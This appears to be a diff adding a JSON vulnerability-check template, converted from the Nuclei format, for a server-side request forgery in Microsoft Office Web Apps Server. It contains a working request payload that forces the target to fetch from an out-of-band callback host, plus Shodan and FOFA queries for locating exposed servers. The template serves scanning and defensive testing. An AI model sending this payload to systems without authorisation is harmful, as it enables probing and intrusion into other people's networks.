@@ -1,0 +1,134 @@
+{
+  "id": "office-webapps-ssrf",
+  "name": "Office Web Apps Server Full Read - Server Side Request Forgery",
+  "author": "DhiyaneshDK",
+  "severity": "HIGH",
+  "description": "Office Web Apps Server Full Read is vulnerable to SSRF.",
+  "references": [
+    "https://drive.google.com/file/d/1aeNq_5wVwHRR1np1jIRQM1hocrgcZ6Qu/view (Slide 37,38)"
+  ],
+  "tags": [
+    "microsoft",
+    "office-webapps",
+    "redirect"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "body\u003d\"Provide a link that opens Word\"",
+    "shodan": "html:\"Provide a link that opens Word\""
+  },
+  "variables": {
+    "oast": [
+      "{{interactsh-url}}"
+    ],
+    "string": [
+      "{{to_lower(rand_text_alpha(4))}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /oh/wopi/files/@/wFileId/contents?wFileId\u003dhttp://{{oast}}/{{string}}.xlsx%3fbody\u003d{{string}}%26header\u003dLocation:http://oast.pro%26status\u003d302\u0026access_token_ttl\u003d0 HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(interactsh_protocol, \u0027http\u0027) || contains(interactsh_protocol, \u0027dns\u0027)",
+            "contains(body,\u0027\u003ch1\u003e Interactsh Server \u003c/h1\u003e\u0027)",
+            "status_code \u003d\u003d 200"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "office-webapps-ssrf",
+    "info": {
+      "name": "Office Web Apps Server Full Read - Server Side Request Forgery",
+      "author": "DhiyaneshDK",
+      "severity": "high",
+      "description": "Office Web Apps Server Full Read is vulnerable to SSRF.",
+      "reference": [
+        "https://drive.google.com/file/d/1aeNq_5wVwHRR1np1jIRQM1hocrgcZ6Qu/view (Slide 37,38)"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "shodan_query": "html:\"Provide a link that opens Word\"",
+        "fofa_query": "body\u003d\"Provide a link that opens Word\""
+      },
+      "tags": "microsoft,office-webapps,redirect"
+    },
+    "variables": {
+      "oast": "{{interactsh-url}}",
+      "string": "{{to_lower(rand_text_alpha(4))}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /oh/wopi/files/@/wFileId/contents?wFileId\u003dhttp://{{oast}}/{{string}}.xlsx%3fbody\u003d{{string}}%26header\u003dLocation:http://oast.pro%26status\u003d302\u0026access_token_ttl\u003d0 HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(interactsh_protocol, \u0027http\u0027) || contains(interactsh_protocol, \u0027dns\u0027)",
+              "contains(body,\u0027\u003ch1\u003e Interactsh Server \u003c/h1\u003e\u0027)",
+              "status_code \u003d\u003d 200"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
